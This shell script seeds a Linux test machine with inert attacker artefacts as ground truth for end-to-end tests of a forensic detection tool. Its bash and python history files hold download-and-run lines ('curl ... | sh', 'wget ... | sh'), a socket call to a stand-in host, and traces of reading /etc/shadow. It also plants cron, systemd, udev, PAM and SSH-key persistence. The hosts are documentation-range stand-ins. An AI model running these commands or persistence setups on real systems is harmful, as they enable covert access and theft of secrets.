#!/bin/sh
# Plant known, inert artefacts on a Linux target so E2E tests have ground truth.
# Nothing here executes anything malicious: the "payloads" are text that matches
# Rowanholt's sample YARA rules, keywords and IOC extraction. Network indicators
# use the RFC 5737 / RFC 2606 documentation ranges (198.51.100.0/24, .test).
set -eu

H=/home/gandalf
mkdir -p "$H/.ssh" /tmp/.x /var/www/html /etc/rivendell-lab /etc/systemd/system /etc/cron.d /var/log

# T1059.004 / T1105: shell history with download-and-run.
cat > "$H/.bash_history" <<'EOF'
id
uname -a
cat /etc/passwd
wget http://update.rivendell-lab.test/stage2.sh -O /tmp/.x/update.sh
chmod +x /tmp/.x/update.sh
curl http://198.51.100.23:8080/beacon | sh
echo "api_key=AKIAEXAMPLELAB00000000" >> /tmp/.x/notes.txt
history -c
EOF

# T1053.003: cron persistence.
echo '*/5 * * * * root /tmp/.x/update.sh >/dev/null 2>&1' > /etc/cron.d/lab-update
chmod 0644 /etc/cron.d/lab-update

# T1543.002: systemd service persistence (unit file only; never enabled).
cat > /etc/systemd/system/lab-sync.service <<'EOF'
[Unit]
Description=Lab sync helper
[Service]
ExecStart=/tmp/.x/update.sh
Restart=always
[Install]
WantedBy=multi-user.target
EOF

# T1098.004: an extra authorized key (public half only; the private key is discarded).
ssh-keygen -q -t ed25519 -N '' -C 'attacker@rivendell-lab.test' -f /tmp/labkey
cat /tmp/labkey.pub >> "$H/.ssh/authorized_keys"
rm -f /tmp/labkey /tmp/labkey.pub

# Hidden staging directory with a script that matches Suspicious_Network_Activity.
cat > /tmp/.x/update.sh <<'EOF'
#!/bin/sh
# rivendell-lab inert payload: prints, never connects
echo "wget http://c2.rivendell-lab.test/next"
echo "contact 198.51.100.23:4444"
EOF
chmod 0755 /tmp/.x/update.sh
printf 'password=Winter2026!\nsecret token for lab\n' > /tmp/.x/notes.txt

# T1505.003: web shell marker (static text, not a working shell).
cat > /var/www/html/status.php <<'EOF'
<?php /* rivendell-lab web shell marker: powershell -enc bypass hidden */ echo "ok"; ?>
EOF

# Fake auth log with a brute force then success from a documentation address.
i=1
while [ $i -le 20 ]; do
  echo "Oct 24 03:1$((i % 10)):0$((i % 10)) lab sshd[10$i]: Failed password for root from 198.51.100.77 port 5$i ssh2" >> /var/log/auth.log
  i=$((i + 1))
done
echo "Oct 24 03:20:00 lab sshd[1999]: Accepted password for gandalf from 198.51.100.77 port 50999 ssh2" >> /var/log/auth.log

# Persistence and history artefacts beyond the core set (process/linux_artefacts.py).
# All inert: nothing here runs on a container (no udevd, no desktop, no systemd),
# and the profile.d line is guarded by a variable that's never set.
mkdir -p /etc/profile.d /etc/pam.d /etc/udev/rules.d /etc/systemd/system-generators \
    "$H/.config/autostart" "$H/.config/systemd/user" /var/tmp
# T1546.004: download-and-run in a login script
echo '[ -n "${RIVENDELL_LAB_NEVER_SET:-}" ] && wget -qO- http://update.rivendell-lab.test/p | sh' > /etc/profile.d/lab-update.sh
# T1556.003: a PAM stack for a service nothing uses, with a module outside the security directory
echo 'auth sufficient /tmp/.x/pam_lab.so' > /etc/pam.d/lab-backdoor
# T1547.013 / T1543.002: XDG autostart and a systemd user unit
printf '[Desktop Entry]\nType=Application\nName=Lab Updater\nExec=/tmp/.x/update.sh\n' > "$H/.config/autostart/lab-updater.desktop"
printf '[Unit]\nDescription=Lab agent\n[Service]\nExecStart=/tmp/.x/update.sh\n[Install]\nWantedBy=default.target\n' > "$H/.config/systemd/user/lab-agent.service"
# T1546.017: udev rule that runs a staged script
echo 'ACTION=="add", SUBSYSTEM=="usb", RUN+="/bin/sh -c '"'"'/tmp/.x/update.sh'"'"'"' > /etc/udev/rules.d/99-lab-usb.rules
# T1543.002: a systemd generator
printf '#!/bin/sh\nexit 0\n' > /etc/systemd/system-generators/lab-gen
chmod 0755 /etc/systemd/system-generators/lab-gen
# An ELF binary in a temp directory (a copy of true)
cp /bin/true /var/tmp/.lab-elf
# T1110.001: btmp with 12 failed root logins from a documentation address
python3 - <<'PY'
import struct, time
rec = struct.Struct("<hxxi32s4s32s256shhiii16s20x")
with open("/var/log/btmp", "wb") as out:
    for i in range(12):
        out.write(rec.pack(6, 2000 + i, b"ssh:notty", b"", b"root", b"198.51.100.77", 0, 0, 0,
                           int(time.time()) - 3600 + i, 0, bytes([198, 51, 100, 77]) + b"\0" * 12))
PY
chmod 0600 /var/log/btmp
# Shell and tool histories beyond bash
printf '_HiStOrY_V2_\nselect\\040*\\040from\\040wp_users;\n' > "$H/.mysql_history"
printf 'import socket\nsocket.create_connection(("198.51.100.23", 4444))\n' > "$H/.python_history"
printf '# Command Line History (newest to oldest):\n:w /tmp/.x/shadow.bak\n# File marks:\n'"'"'0  1  0  /etc/shadow\n' > "$H/.viminfo"

chown -R gandalf:gandalf "$H" 2>/dev/null || chown -R gandalf "$H"
chmod 700 "$H/.ssh"
chmod 600 "$H/.ssh/authorized_keys"

# A Docker host's and a Kubernetes node's state on disk, nothing running
sh "$(dirname "$0")/seed-containers.sh"

# Ground truth for the E2E checks (copied off the target by lab.sh).
cat > /etc/rivendell-lab/expected.json <<'EOF'
{
  "seeded": [
    {"path": "/home/gandalf/.bash_history", "attack": "T1059.004", "expect": ["wget http", "curl http", "198.51.100.23"]},
    {"path": "/etc/cron.d/lab-update", "attack": "T1053.003"},
    {"path": "/etc/systemd/system/lab-sync.service", "attack": "T1543.002"},
    {"path": "/home/gandalf/.ssh/authorized_keys", "attack": "T1098.004", "expect": ["attacker@rivendell-lab.test"]},
    {"path": "/tmp/.x/update.sh", "attack": "T1105", "yara": ["Suspicious_Network_Activity"]},
    {"path": "/tmp/.x/notes.txt", "keywords": ["password", "secret", "api_key"]},
    {"path": "/var/www/html/status.php", "attack": "T1505.003", "attack_by": "yara", "yara": ["Suspicious_PowerShell_Command"]},
    {"path": "/var/log/auth.log", "attack": "T1110.001", "expect": ["198.51.100.77"]},
    {"path": "/etc/profile.d/lab-update.sh", "attack": "T1546.004", "cooked": "shell_init.csv"},
    {"path": "/etc/pam.d/lab-backdoor", "attack": "T1556.003", "cooked": "pam.csv"},
    {"path": "/etc/sudoers.d/gandalf", "attack": "T1548.003", "cooked": "sudoers.csv"},
    {"path": "/home/gandalf/.config/autostart/lab-updater.desktop", "attack": "T1547.013", "cooked": "autostart.csv"},
    {"path": "/home/gandalf/.config/systemd/user/lab-agent.service", "attack": "T1543.002", "cooked": "autostart.csv"},
    {"path": "/etc/udev/rules.d/99-lab-usb.rules", "attack": "T1546.017", "cooked": "udev_rules.csv"},
    {"path": "/etc/systemd/system-generators/lab-gen", "attack": "T1543.002", "cooked": "generators.csv"},
    {"path": "/var/tmp/.lab-elf", "cooked": "tmp_executables.csv"},
    {"path": "/var/log/btmp", "attack": "T1110.001", "cooked": "login_records.csv", "expect": ["198.51.100.77"]},
    {"path": "/home/gandalf/.mysql_history", "cooked": "shell_histories.csv", "expect": ["wp_users"]},
    {"path": "/home/gandalf/.viminfo", "cooked": "viminfo.csv", "expect": ["/etc/shadow"]},
    {"path": "/var/lib/docker/containers/4f1c9e2ab3d7c0de5eedfacade1b0b0c4f1c9e2ab3d7c0de5eedfacade1b0b0c/config.v2.json", "attack": "T1611", "cooked": "docker_containers.csv", "expect": ["container runtime socket mounted"]},
    {"path": "/var/lib/docker/containers/4f1c9e2ab3d7c0de5eedfacade1b0b0c4f1c9e2ab3d7c0de5eedfacade1b0b0c/4f1c9e2ab3d7c0de5eedfacade1b0b0c4f1c9e2ab3d7c0de5eedfacade1b0b0c-json.log", "cooked": "container_logs.csv", "expect": ["c2.rivendell-lab.test"]},
    {"path": "/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db", "attack": "T1611", "cooked": "docker_containers.csv", "expect": ["containerd", "lab-escape", "host PID namespace"]},
    {"path": "/var/lib/containers/storage/db.sql", "attack": "T1611", "cooked": "docker_containers.csv", "expect": ["podman", "lab-sock", "container runtime socket mounted (/run/podman/podman.sock)"]},
    {"artefact": "container writable layer", "attack": "T1105", "cooked": "container_changes.csv", "expect": ["/tmp/.x/lab-miner", "cron changed"]},
    {"path": "/etc/kubernetes/manifests/lab-node-agent.yaml", "attack": "T1543.005", "cooked": "static_pods.csv"},
    {"path": "/var/log/pods/payments_api-7d9f_0b1c/api/0.log", "cooked": "container_logs.csv", "expect": ["payments"]},
    {"path": "/var/log/kubernetes/audit/audit.log", "attack": "T1552.007", "cooked": "k8s_audit.csv", "expect": ["T1609", "T1098.006"]}
  ],
  "iocs": ["198.51.100.23", "198.51.100.77", "c2.rivendell-lab.test", "update.rivendell-lab.test"],
  "stacking": ["lab-sync.service", "lab-agent.service", "lab updater"]
}
EOF
